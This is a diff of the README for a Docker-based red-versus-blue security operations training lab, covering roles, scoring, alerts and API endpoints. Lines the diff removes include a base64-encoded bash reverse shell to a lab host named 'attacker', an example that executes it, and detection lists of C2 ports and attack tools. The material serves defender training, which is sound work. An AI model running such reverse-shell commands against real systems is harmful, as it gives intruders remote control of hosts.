@@ -1,25 +1,25 @@
-# 🔴🔵 Mini SOC Lab — Red Team vs Blue Team Adversarial Simulation
+# 🔴🔵 Mini SOC Lab — Immersive Red vs Blue Adversarial Exercise
 
-A **real-time, adversarial Red Team vs Blue Team security operations simulation** built on Docker. Red Team launches attacks (malware, C2 beacons, persistence mechanisms) while Blue Team investigates, detects, and responds to defend the victim infrastructure.
+A **real-time, role-based Red Team vs Blue Team security operations simulation** built on Docker. Choose your role — Red Team operator, Blue Team SOC analyst, or Spectator — and engage in an adversarial exercise with SSE-streamed telemetry, malware analysis, detection signatures, honeypots, and consequence-driven scoring.
 
 ---
 
 ## 🎯 Overview
 
-This is an **event-driven, manual adversarial simulation** — not an automated game loop:
+This is an **immersive, event-driven adversarial exercise** with role-based views:
 
-- **🔴 Red Team**: Execute arbitrary commands, upload/execute malware, establish persistence, and evade detection
-- **🔵 Blue Team**: Monitor processes, analyze files, detect behavioral anomalies, and respond with defensive actions
-- **📊 Real-time Visibility**: Monitoring agent sends system events to backend; Blue Team sees alerts in <5 seconds
-- **⚔️ Competitive Scoring**: Red Team earns points for attacks; Blue Team earns points for detection and response
+- **🔴 Red Team**: Operator terminal with SSE-streamed output, APT campaign presets, kill chain tracking, C2 dashboard
+- **🔵 Blue Team**: SOC analyst workstation with SIEM alerts (real-time SSE), malware analysis workbench, detection signature management, honeypot deployment
+- **📡 Spectator**: Full mission control dashboard — both teams' scores, kill chain, alerts, logs, all stats
+- **⚔️ Consequence-Driven Scoring**: Triage countdowns on critical alerts, auto-escalation on idle defenders, win/lose/draw conditions
 
 ---
 
 ## 🏗️ Technology Stack
 
-- **Frontend**: React + Vite (interactive Red/Blue Team panels)
-- **Backend**: Java 17 + Spring Boot (API orchestrator, event processor)
-- **Deployment**: Docker Compose (4-container ecosystem)
+- **Frontend**: React 18 + Vite + React Router (role-based SPA with SSE streaming)
+- **Backend**: Java 17 + Spring Boot (SSE via SseEmitter, malware analysis engine, signature matching)
+- **Deployment**: Docker Compose (4-container ecosystem, single port 3000)
 - **Monitoring**: Python psutil agent on victim (process, network, file, cron detection)
 
 ---
@@ -28,54 +28,59 @@ This is an **event-driven, manual adversarial simulation** — not an automated 
 
 ```
 mini-soc-lab-fullstack/
-├── frontend/                      # React dashboard
+├── frontend/                      # React SPA (role-based routing)
 │   ├── src/
+│   │   ├── pages/
+│   │   │   ├── RoleSelect.jsx         # Role selection + difficulty + game start
+│   │   │   ├── RedTeamConsole.jsx     # 🔴 3-column operator console
+│   │   │   ├── BlueTeamSOC.jsx        # 🔵 3-column SOC analyst view
+│   │   │   └── MissionControl.jsx     # 📡 Spectator dashboard
 │   │   ├── components/
-│   │   │   ├── RedTeamPanel.jsx       # 🔴 Terminal, Payloads, Quick Attacks
-│   │   │   ├── BlueTeamPanel.jsx      # 🔵 Investigation: processes, files, behavioral
+│   │   │   ├── OperatorTerminal.jsx   # Dark terminal with SSE streaming
+│   │   │   ├── MalwareWorkbench.jsx   # Static analysis + file browser
+│   │   │   ├── SignatureManager.jsx   # Detection signature CRUD
+│   │   │   ├── RedTeamPanel.jsx       # Legacy Red Team panel (spectator)
+│   │   │   ├── BlueTeamPanel.jsx      # Legacy Blue Team panel (spectator)
 │   │   │   ├── ActionPanel.jsx        # Blue Team defensive actions
 │   │   │   ├── AlertsPanel.jsx        # Alert display & resolution
 │   │   │   └── ...
+│   │   ├── hooks/
+│   │   │   └── useSse.js             # SSE hooks (alerts, logs, command streams)
 │   │   ├── api/
-│   │   │   └── client.js              # API calls (Red/Blue endpoints)
-│   │   └── styles/app.css             # Dashboard styling
+│   │   │   └── client.js             # API calls (all endpoints)
+│   │   └── styles/app.css
 │   ├── Dockerfile
-│   ├── nginx.conf
+│   ├── nginx.conf                 # SSE proxy config (proxy_buffering off)
 │   └── package.json
 ├── backend/                       # Spring Boot API
 │   ├── src/main/java/com/minisoc/lab/
 │   │   ├── controller/
-│   │   │   ├── RedTeamController.java     # 🔴 POST /api/red-team/execute, upload-malware
-│   │   │   ├── BlueTeamController.java    # 🔵 GET /api/blue-team/processes, scan-file, etc.
-│   │   │   └── SimulationController.java  # Game control
+│   │   │   ├── RedTeamController.java     # 🔴 execute, stream, upload (hash-block)
+│   │   │   ├── BlueTeamController.java    # 🔵 analyze, signatures, honeypots, notes
+│   │   │   └── SimulationController.java  # Game control + SSE endpoints
 │   │   ├── service/
-│   │   │   ├── SimulationService.java     # Core orchestrator
-│   │   │   ├── EventAlertMapper.java      # Event → Alert (MITRE mapping)
+│   │   │   ├── SimulationService.java     # Core orchestrator (win conditions, escalation)
+│   │   │   ├── StreamingService.java      # SSE emitter pools (alerts/logs/commands)
+│   │   │   ├── CommandStreamService.java  # Docker exec with line-by-line SSE
+│   │   │   ├── MalwareAnalysisService.java # Static analysis (strings, entropy, IOCs)
+│   │   │   ├── SignatureService.java      # Detection signature CRUD + matching
+│   │   │   ├── EventAlertMapper.java      # Event → Alert (MITRE + signatures + honeypots)
 │   │   │   └── ActionExecutor.java        # Blue Team actions (kill, block, isolate)
-│   │   ├── executor/
-│   │   │   ├── SystemCommandExecutor.java # Docker exec wrapper
-│   │   │   └── AttackExecutor.java        # Unused (legacy)
 │   │   └── model/
-│   │       ├── GameAlert.java            # Actionable alert
-│   │       ├── SystemEvent.java          # Raw monitoring event
-│   │       ├── GameState.java            # Score, threat, phase
+│   │       ├── GameAlert.java            # Actionable alert (triage countdown, notes)
+│   │       ├── DetectionSignature.java   # HASH/STRING/NETWORK_IOC signatures
+│   │       ├── AnalysisReport.java       # Malware analysis results
+│   │       ├── IncidentReport.java       # Post-game incident report
+│   │       ├── GameState.java            # Score, threat, phase, honeypots
 │   │       └── ...
 │   ├── Dockerfile
-│   ├── pom.xml
-│   └── src/main/resources/application.properties
+│   └── pom.xml
 ├── containers/
-│   ├── victim/                    # Ubuntu target
-│   │   ├── monitor/process_monitor.py   # Monitoring agent
-│   │   ├── Dockerfile
-│   │   └── start.sh
-│   └── attacker/                  # Ubuntu C2/staging
-│       ├── attacks/               # Sample malware scripts
-│       └── Dockerfile
-├── scripts/
-│   └── attacks/                   # Phase-based attack scripts
-├── docker-compose.yml             # 4-container definition
-├── RED_TEAM_ATTACK_GUIDE.md       # Detailed curl examples & attack walkthroughs
-└── README.md                      # This file
+│   ├── victim/                    # Ubuntu target with monitoring agent
+│   └── attacker/                  # Ubuntu C2/staging with attack scripts
+├── docker-compose.yml
+├── RED_TEAM_ATTACK_GUIDE.md
+└── README.md
 ```
 
 ---
@@ -84,7 +89,7 @@ mini-soc-lab-fullstack/
 
 ### Prerequisites
 - Docker + Docker Compose
-- Port 3000 (frontend), 8080 (API) available
+- Port 3000 available
 
 ### Run the Stack
 
@@ -93,341 +98,203 @@ cd mini-soc-lab-fullstack
 docker compose up --build
 ```
 
-**Wait ~10 seconds for containers to stabilize**, then:
+**Wait ~10 seconds**, then open: **http://localhost:3000**
 
-```
-Frontend:  http://localhost:3000
-API:       http://localhost:8080/api/health
-```
+You'll see the **Role Selection** screen. Choose your role:
+- **🔴 Red Team** — Operator console with terminal + campaign presets
+- **🔵 Blue Team** — SOC analyst with SIEM alerts + malware workbench
+- **📡 Spectator** — Full mission control dashboard
 
 ### Verify Health
 
 ```bash
 curl http://localhost:8080/api/health
 # {"status":"UP"}
-
-docker compose ps
-# 4 containers: backend, frontend, victim, attacker (all running)
 ```
 
 ---
 
-## 🎮 How to Use
+## 🎮 Roles & Gameplay
 
-### 1️⃣ Start a Game
+### 🔴 Red Team Console (`/red`)
 
-```bash
-curl -X POST http://localhost:8080/api/simulation/start \
-  -H "Content-Type: application/json" \
-  -d '{"difficulty":"MEDIUM"}'
-```
+3-column operator layout:
 
-Response:
-```json
-{"message":"Game started","difficulty":"MEDIUM"}
-```
+| Left Panel | Center | Right Panel |
+|------------|--------|-------------|
+| APT campaign presets (APT29, FIN7, Lazarus) | **Operator Terminal** with SSE-streamed output | C2 Dashboard (beacon count, persistence) |
+| Kill chain checklist | Container toggle (victim/attacker) | Quick action buttons |
+| Command history | Command history (↑/↓ navigation) | Score + phase display |
 
-### 2️⃣ Red Team: Upload & Execute Malware
+**Key capabilities:**
+- Stream command output in real-time via SSE (no polling)
+- Upload malware (auto-blocked if Blue Team deployed matching hash signature → -15 pts)
+- APT campaign presets with pre-built kill chain checklists
+- Container switching between soc-victim and soc-attacker
 
-#### Option A: Upload Reverse Shell
+### 🔵 Blue Team SOC (`/blue`)
 
-```bash
-curl -X POST http://localhost:8080/api/red-team/upload-malware \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name":"reverse_shell.sh",
-    "payload":"IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=",
-    "obfuscation":"base64",
-    "targetPath":"/tmp/reverse_shell.sh"
-  }'
-```
+3-column SOC analyst layout:
 
-Response:
-```json
-{
-  "success":true,
-  "filePath":"/tmp/reverse_shell.sh",
-  "points":5
-}
-```
+| Left Panel | Center | Right Panel |
+|------------|--------|-------------|
+| **SIEM Alerts** (SSE real-time) | **Malware Workbench** | Defense Controls |
+| Triage countdown timers | Static analysis (strings, entropy, hex) | Quick response buttons |
+| Inline actions (kill PID, block IP) | File browser | 🍯 Honeypot planting |
+| Analyst notes per alert | Signature workshop | Threat level gauge |
 
-#### Option B: Execute Command (Terminal)
+**Key capabilities:**
+- Real-time alerts via SSE with severity badges and countdown timers
+- Critical alerts have triage deadlines — miss them and threat spikes +15
+- Malware analysis: file type, SHA256, extracted strings, entropy, IOC detection
+- Deploy detection signatures (HASH, STRING, NETWORK_IOC) that auto-upgrade future alerts
+- Plant honeypot files that trigger CRITICAL alerts when Red Team accesses them
+- Analyst notes on alerts for investigation documentation
+- Redacted command lines until file is analyzed (attribution delay mechanic)
 
-```bash
-curl -X POST http://localhost:8080/api/red-team/execute \
-  -H "Content-Type: application/json" \
-  -d '{
-    "container":"soc-victim",
-    "command":"bash /tmp/reverse_shell.sh &"
-  }'
-```
+### 📡 Spectator / Mission Control (`/spectator`)
 
-Response:
-```json
-{
-  "success":true,
-  "output":"",
-  "points":10,
-  "durationMs":245,
-  "async":true
-}
-```
-
-#### Option C: Use Frontend UI
-
-1. Open `http://localhost:3000`
-2. Navigate to **Red Team Panel** → **Payloads** tab
-3. Click **Reverse Shell** button → automatically uploads
-4. Switch to **Terminal** tab → select target container → type command
-5. See execution history with success/failure, output, and points
+Full dashboard with both teams' views — kill chain visualization, stat cards, alerts, logs, todos.
 
 ---
 
-### 3️⃣ Blue Team: Investigate & Respond
+## ⚔️ Scoring & Win Conditions
 
-#### Investigate Processes
+### Win Conditions
 
-```bash
-curl -X GET http://localhost:8080/api/blue-team/processes
-```
+| Outcome | Condition |
+|---------|-----------|
+| 🔵 **BLUE WIN** | Threat = 0, no malicious PIDs, no persistence, no open critical alerts |
+| 🔴 **RED WIN** | Threat ≥ 100 OR attack reaches EXFILTRATION phase |
+| 🤝 **DRAW** | Game exceeds 900 seconds (15 minutes) |
 
-Response:
-```json
-{
-  "success":true,
-  "output":"USER       PID %CPU %MEM    VSZ   RSS TTY STAT START   TIME COMMAND\nroot        13  0.4  0.3 35396 28252 ?   S   11:03  0:00 python3 /opt/monitor/process_monitor.py\nroot      1234  0.1  0.1  4456  3124 ?   S   11:05  0:00 bash -i >& /dev/tcp/attacker/4444 0>&1"
-}
-```
+### Escalation Mechanics
 
-#### Scan File for Malware
-
-```bash
-curl -X POST http://localhost:8080/api/blue-team/scan-file \
-  -H "Content-Type: application/json" \
-  -d '{"filePath":"/tmp/reverse_shell.sh"}'
-```
-
-Response:
-```json
-{
-  "success":true,
-  "filePath":"/tmp/reverse_shell.sh",
-  "verdict":"MALICIOUS",
-  "threatScore":90,
-  "entropy":3.45,
-  "threats":[
-    {
-      "type":"TROJAN",
-      "name":"Trojan.ReverseShell.Bash",
-      "severity":"CRITICAL",
-      "detail":"Bash reverse shell pattern detected"
-    }
-  ]
-}
-```
-
-**Blue Team awarded +20 points for detection**
-
-#### Run Behavioral Analysis
-
-```bash
-curl -X GET "http://localhost:8080/api/blue-team/behavioral-analysis?minutes=5"
-```
-
-Response:
-```json
-{
-  "success":true,
-  "eventCount":12,
-  "anomalies":[
-    {
-      "type":"C2_COMMUNICATION",
-      "description":"Outbound connections to known C2 ports detected",
-      "score":85
-    },
-    {
-      "type":"SUSPICIOUS_PROCESSES",
-      "description":"Known attack tool processes detected: 3",
-      "score":80
-    }
-  ],
-  "combinedThreatScore":85,
-  "recommendation":"INVESTIGATE_AND_RESPOND"
-}
-```
-
-**Blue Team awarded +15 points for behavioral analysis**
-
-#### Kill Malicious Process
-
-```bash
-curl -X POST http://localhost:8080/api/actions/kill-process \
-  -H "Content-Type: application/json" \
-  -d '{"pid":1234}'
-```
-
-**Blue Team awarded +30 points for successful kill**
-
-#### Block Attacker IP
-
-```bash
-curl -X POST http://localhost:8080/api/actions/block-ip \
-  -H "Content-Type: application/json" \
-  -d '{"ip":"172.20.0.2"}'
-```
-
-**Blue Team awarded +25 points for blocking IP**
-
-#### Isolate Host (Nuclear Option)
-
-```bash
-curl -X POST http://localhost:8080/api/actions/isolate-host \
-  -H "Content-Type: application/json"
-```
-
-Effect: Network isolation (all traffic blocked), suspicious processes killed.
-**Blue Team awarded +40 points**
-
----
-
-## 📊 Scoring System
+- **Idle penalty**: If Blue Team takes no action for 45 seconds, attack phase auto-advances
+- **Triage countdown**: CRITICAL alerts expire after a set time → threat spikes +15
+- **C2 session bonus**: Active C2 beacons add +15 threat every 60 seconds
 
 ### Red Team Points
 
 | Action | Points |
 |--------|--------|
-| Recon (nmap, ping) | +1 |
-| Basic command (whoami, ls) | +1 |
 | Upload malware | +5 |
-| Reverse shell execution | +10 |
-| C2 beacon setup | +10 |
+| Reverse shell / C2 beacon | +10 |
 | Cron persistence | +10 |
 | Ransomware simulation | +20 |
 | Data exfiltration | +20 |
+| Malware blocked by signature | **-15** |
 
 ### Blue Team Points
 
 | Action | Points |
 |--------|--------|
-| File scan (detect malware) | +20 |
-| Kill process | +30 |
-| Block IP | +25 |
-| Remove cron | +20 |
-| Manual alert resolve | +15–30 |
+| Analyze file (malware workbench) | +20 |
+| Kill process (within 10s of alert) | +40 (speed bonus) |
+| Kill process (normal) | +30 |
+| Block C2 IP | +35 |
+| Block other IP | +25 |
+| Deploy detection signature | +30 |
+| Remove cron persistence | +20 |
 | Isolate host | +40 |
-| Behavioral analysis | +15 |
 
 ---
 
-## 🚨 Alert System
+## 🔍 New Features
 
-Alerts are **event-driven** — generated when the monitoring agent detects suspicious activity:
+### SSE Streaming
+All telemetry streams via Server-Sent Events — no polling lag:
+- `GET /api/stream/alerts` — Real-time alert feed
+- `GET /api/stream/logs` — Live log entries
+- `GET /api/stream/command/{id}` — Per-command stdout/stderr streaming
 
-1. **Monitoring Agent** (victim VM): Detects `PROCESS_SPAWNED`, `NETWORK_CONNECTION`, `FILE_CREATED`, `CRON_ADDED`, etc.
-2. **EventAlertMapper**: Maps raw events to `GameAlert` with MITRE ATT&CK context
-3. **Blue Team**: Sees alert in UI with:
-   - Severity (CRITICAL, HIGH, MEDIUM, LOW)
-   - Title + detailed description
-   - MITRE ID + name (e.g., T1059.004 — "Unix Shell")
-   - Actionable fields (PID to kill, IP to block)
-   - Threat impact on score
+### Malware Analysis Engine
+Static analysis via docker exec on the victim container:
+- File type identification (`file` command)
+- SHA256 hash computation
+- String extraction with suspicious pattern matching
+- Entropy calculation (packed/encrypted detection)
+- IOC extraction (IPs, URLs, base64 blobs)
+- Threat rule matching (reverse shells, droppers, C2 beacons, ransomware)
 
-### Alert Status Workflow
+### Detection Signatures
+Blue Team can deploy custom signatures:
+- **HASH** — Block known-bad SHA256 hashes (auto-blocks Red Team uploads)
+- **STRING** — Match patterns in event data (upgrades alerts to CRITICAL)
+- **NETWORK_IOC** — Match IPs/domains (auto-created when blocking C2 IPs)
 
-```
-OPEN → (Blue Team acts) → RESOLVING → (agent confirms) → RESOLVED
-                                    or
-                      → (Blue fails action) → FAILED
-                      or
-                      → (Blue manually resolves) → RESOLVED
-```
+### Honeypots
+Blue Team plants decoy files (e.g., `/tmp/.soc_honeypot_credentials.txt`). When Red Team accesses them, a CRITICAL alert fires with +40 threat impact.
 
----
-
-## 🔍 Behavioral Analysis Detectors
-
-Triggered manually by Blue Team (`GET /api/blue-team/behavioral-analysis?minutes=N`):
-
-- **C2 Communication**: Outbound connections to suspicious ports (4444, 5555, 9999, 1234, 8888)
-- **Rapid Process Spawn**: >20 process spawns in time window
-- **Rapid File Creation**: >10 files created in /tmp in time window
-- **Persistence Installed**: CRON_ADDED events detected
-- **Suspicious Process Names**: nc, nmap, python, perl, ruby in process name or cmdline
-- **High Entropy**: Packed/encoded files detected by entropy calculation
+### Post-Game Incident Report
+`GET /api/game/report` returns a full incident report: timeline, alerts raised, signatures deployed, Blue Team actions, Red Team commands.
 
 ---
 
 ## 🗂️ API Endpoints Reference
 
 ### Simulation Control
-- `POST /api/simulation/start` → Start new game
-- `POST /api/simulation/reset` → Reset game state
-- `GET /api/dashboard/summary` → Game state (score, threat, phase)
-- `GET /api/dashboard/logs` → Raw event logs
-- `GET /api/dashboard/alerts` → Current alerts
-- `GET /api/todos` → Todo items for both teams
+- `POST /api/simulation/start` — Start game (body: `{difficulty, persistSignatures}`)
+- `POST /api/simulation/reset` — Reset game state
+- `GET /api/dashboard/summary` — Game state
+- `GET /api/dashboard/alerts` — Current alerts
+- `GET /api/dashboard/logs` — Event logs
+- `GET /api/game/report` — Post-game incident report
+
+### SSE Streams
+- `GET /api/stream/alerts` — Alert SSE stream
+- `GET /api/stream/logs` — Log SSE stream
+- `GET /api/stream/command/{commandId}` — Command output stream
 
 ### Red Team 🔴
-- `POST /api/red-team/execute` → Execute command (container, command)
-- `POST /api/red-team/upload-malware` → Upload malware (name, payload, obfuscation, path)
-- `GET /api/red-team/history` → Audit trail of all Red Team actions
+- `POST /api/red-team/execute` — Execute command
+- `POST /api/red-team/execute-stream` — Execute with SSE streaming (returns commandId)
+- `POST /api/red-team/upload-malware` — Upload malware (hash-checked against signatures)
+- `GET /api/red-team/history` — Command audit trail
 
 ### Blue Team 🔵
-- `GET /api/blue-team/processes` → List running processes (ps aux)
-- `GET /api/blue-team/connections` → List network connections (ss/netstat)
-- `GET /api/blue-team/files` → List suspicious files (/tmp, /var/tmp, /dev/shm)
-- `POST /api/blue-team/scan-file` → Scan file for malware signatures
-- `GET /api/blue-team/behavioral-analysis?minutes=N` → Anomaly detection analysis
+- `GET /api/blue-team/processes` — List processes
+- `GET /api/blue-team/connections` — List network connections
+- `GET /api/blue-team/files` — List suspicious files
+- `POST /api/blue-team/scan-file` — Legacy file scan
+- `POST /api/blue-team/analyze-file` — Malware workbench analysis (+20 pts)
+- `GET /api/blue-team/behavioral-analysis` — Anomaly detection
+- `POST /api/blue-team/signatures` — Deploy detection signature (+30 pts)
+- `GET /api/blue-team/signatures` — List signatures
+- `DELETE /api/blue-team/signatures/{id}` — Remove signature
+- `POST /api/blue-team/plant-honeypot` — Plant honeypot file
+- `PATCH /api/blue-team/alerts/{id}/notes` — Update analyst notes
 
 ### Blue Team Actions 🛡️
-- `POST /api/actions/kill-process` → Kill process by PID
-- `POST /api/actions/block-ip` → Block IP via iptables
-- `POST /api/actions/isolate-host` → Full host isolation (network + processes)
-- `POST /api/actions/remove-cron` → Remove cron persistence
-
----
-
-## 📖 Detailed Guides
-
-### Complete Attack Walkthrough
-
-See **[RED_TEAM_ATTACK_GUIDE.md](./RED_TEAM_ATTACK_GUIDE.md)** for:
-- Step-by-step attack execution with curl examples
-- Malware payload descriptions & detection signatures
-- Timeline visualization of attack vs defense
-- Evasion techniques
-- Troubleshooting
+- `POST /api/actions/kill-process` — Kill process by PID
+- `POST /api/actions/block-ip` — Block IP (also kills beacon processes)
+- `POST /api/actions/isolate-host` — Full host isolation
+- `POST /api/actions/remove-cron` — Remove cron persistence
 
 ---
 
 ## 🐳 Container Architecture
 
 ### `soc-backend` (Spring Boot)
-- Listens on port 8080
-- Mounts Docker socket (`/var/run/docker.sock`)
-- Orchestrates Red Team attacks via `docker exec`
-- Processes Blue Team investigation queries
-- Maps events to alerts in real-time
-- Maintains game state (score, alerts, logs)
+- Port 8080, mounts Docker socket
+- SSE emitter pools for real-time streaming
+- Malware analysis via docker exec subprocess calls
+- Signature matching engine, honeypot tracking
+- Win condition evaluation, escalation timers
 
 ### `soc-frontend` (React + Nginx)
-- Listens on port 3000
-- Serves React SPA
-- Proxies API calls to backend:8080
-- Displays Red/Blue Team panels, alerts, logs
-- Real-time polling (4-second refresh rate)
+- Port 3000, serves React SPA with role-based routing
+- Nginx configured for SSE passthrough (`proxy_buffering off`)
+- Routes: `/` (role select), `/red`, `/blue`, `/spectator`
 
 ### `soc-victim` (Ubuntu 22.04)
-- Target of Red Team attacks
-- Runs **monitoring agent** (`process_monitor.py`) — detects events every 2 seconds
-- Has basic tools: bash, netcat, cron, iptables, python3, psutil, requests
-- **Port 4444** available for reverse shells (C2 listener)
+- Attack target with monitoring agent (2s polling)
+- Tools: bash, netcat, cron, iptables, python3, psutil
+- Honeypot files planted by Blue Team
 
 ### `soc-attacker` (Ubuntu 22.04)
-- C2/staging container for Red Team
-- Tools: nc, nmap, bash
-- Can act as listener for reverse shells
-- Can send attacks to victim via docker exec
+- C2/staging container with attack scripts
+- Tools: nc, nmap, bash, curl
 
 ---
 
@@ -439,59 +306,22 @@ See **[RED_TEAM_ATTACK_GUIDE.md](./RED_TEAM_ATTACK_GUIDE.md)** for:
 - Docker + Docker Compose
 
 ### Backend Only
-
 ```bash
 cd backend
 mvn spring-boot:run
-# Listens on http://localhost:8080
 ```
 
 ### Frontend Only
-
 ```bash
 cd frontend
 npm install
 npm run dev
-# Listens on http://localhost:5173
-# Requires backend running (uses http://localhost:8080)
+# http://localhost:5173 (requires backend on :8080)
 ```
 
-### Both (Docker)
-
+### Full Stack (Docker)
 ```bash
 docker compose up --build
-```
-
----
-
-## 📝 Notable Features
-
-✅ **Manual Red Team Control**: No automated attacks; Red Team has full control via API/UI
-✅ **Signature-based Detection**: YARA-like pattern matching for malware
-✅ **Behavioral Analysis**: ML-free anomaly detection based on event patterns
-✅ **Event-driven Architecture**: Real-time events, no polling for simulation updates
-✅ **MITRE ATT&CK Mapping**: Alerts include MITRE framework context
-✅ **Competitive Scoring**: Both teams tracked, displayed in real-time
-✅ **Persistence Simulation**: Cron-based backdoors, beacon loops, file creation
-✅ **Obfuscation Support**: Base64/hex encoding for payload delivery
-✅ **Docker Isolation**: Full Docker container ecosystem for safety
-
----
-
-## 🎯 Gameplay Example
-
-```
-T+0s:   Game started
-T+10s:  Red uploads reverse_shell.sh → +5 pts (Red: 5, Blue: 0)
-T+15s:  Red executes reverse shell → +10 pts → bash process spawns
-T+17s:  🚨 ALERT: Reverse Shell Detected → Blue sees "bash -i >& /dev/tcp/attacker/4444"
-T+25s:  Blue scans file → +20 pts (Blue: 20)
-T+30s:  Blue kills PID 1234 → +30 pts (Blue: 50)
-T+31s:  ✓ Alert auto-resolved (process confirmed dead)
-T+35s:  Blue blocks 172.20.0.2 → +25 pts (Blue: 75)
-        Game threat score: 30 → 15 → 10 (from Blue actions)
-
-Final: Red: 15 pts | Blue: 75 pts
 ```
 
 ---
@@ -504,38 +334,27 @@ docker compose down
 docker compose up --build
 ```
 
-### Backend API returns 400/Bad Request
-- Ensure game started: `POST /api/simulation/start`
-- Check container names: `docker compose ps`
+### SSE streams not connecting
+- Verify nginx config has `proxy_buffering off`
+- Check browser DevTools → Network → EventStream tab
+- Backend logs: `docker logs soc-backend | tail -20`
 
-### Malware upload/execution returns empty output
-- Long commands (nmap) timeout at 15s. Expected. Set `"async":true` in response.
-- Check victim container has tools: `docker exec soc-victim which nc nmap`
+### Malware analysis returns empty
+- Ensure game is started and victim container is running
+- Check file path exists: `docker exec soc-victim ls -la /tmp/`
 
 ### Blue Team sees no alerts
-- Wait 2-3 seconds for monitoring agent to detect (polls every 2s)
-- Check backend logs: `docker logs soc-backend | tail -20`
-- Verify monitoring agent running: `docker exec soc-victim ps aux | grep monitor`
+- Wait 2-3 seconds for monitoring agent detection cycle
+- Check monitoring agent: `docker exec soc-victim ps aux | grep monitor`
 
 ---
 
 ## 📚 References
 
 - **MITRE ATT&CK Framework**: https://attack.mitre.org/
-- **YARA Rules**: https://yara.readthedocs.io/
 - **Docker Exec Reference**: https://docs.docker.com/engine/reference/commandline/exec/
 
 ---
 
-## 🤝 Contributing
-
-This is an educational security project. Contributions welcome!
-
-- Report bugs via GitHub Issues
-- Submit attack/detection improvements via PRs
-- Suggest new behavioral anomaly detectors
-
----
-
 **Last Updated**: April 2026  
-**Status**: Active Development — Red vs Blue Adversarial Mode Live
+**Status**: Active Development — Immersive RE-Focused Adversarial Exercise
